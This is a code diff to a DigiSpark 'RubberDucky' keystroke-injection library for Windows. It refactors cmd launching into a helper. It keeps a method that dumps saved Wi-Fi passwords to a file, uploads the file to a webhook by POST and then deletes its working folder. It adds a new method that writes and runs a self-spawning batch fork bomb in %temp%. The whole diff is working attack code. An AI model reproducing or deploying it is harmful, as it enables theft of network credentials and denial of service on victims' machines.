@@ -8,7 +8,7 @@
 #define LAYOUT_ITALIAN
 #include "DigiKeyboard.h"
 
-RubberDucky::RubberDucky(uint8_t ledPin) : ledPin(ledPin) { }
+RubberDucky::RubberDucky(uint8_t ledPin) : ledPin(ledPin) {}
 
 void RubberDucky::init(void) {
   pinMode(this->ledPin, OUTPUT);
@@ -32,7 +32,7 @@ void RubberDucky::refreshUSBConnection(void) {
   DigiKeyboard.delay(2000);
 }
 
-void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
+void RubberDucky::launchCMD(bool debug) {
   // Open Run dialog
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // `Win + R`
   DigiKeyboard.delay(1250);
@@ -50,6 +50,11 @@ void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
   }
   DigiKeyboard.write('\n');
   DigiKeyboard.delay(1250);
+}
+
+void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
+  // Open Run dialog and launch CMD
+  launchCMD(debug);
 
   // Navigate to temp directory and prepare workspace
   DigiKeyboard.print("cd %temp% && mkdir RubberDucky && cd RubberDucky");
@@ -72,7 +77,7 @@ void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
   DigiKeyboard.print("\" -Method POST -InFile \"Wi-Fi-Passwd.txt\"");
   DigiKeyboard.write('\n');
   DigiKeyboard.delay(10000);
-  
+
   // Cleaning up all
   DigiKeyboard.print("cd .. && rmdir /s /q RubberDucky");
   DigiKeyboard.write('\n');
@@ -82,4 +87,19 @@ void RubberDucky::stealWindowsWifiPasswords(const char *webhook, bool debug) {
   DigiKeyboard.print("exit");
   DigiKeyboard.write('\n');
   DigiKeyboard.delay(100);
+}
+
+void RubberDucky::forkBomb(bool debug) {
+  // Open Run dialog and launch CMD
+  launchCMD(debug);
+
+  // Creating payload to a temporary directory
+  DigiKeyboard.print("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat");
+  DigiKeyboard.write('\n');
+  DigiKeyboard.delay(500);
+
+  // Executing the fork bomb
+  DigiKeyboard.print("cd %temp% && ouch.bat");
+  DigiKeyboard.write('\n');
+  DigiKeyboard.delay(500);
 }
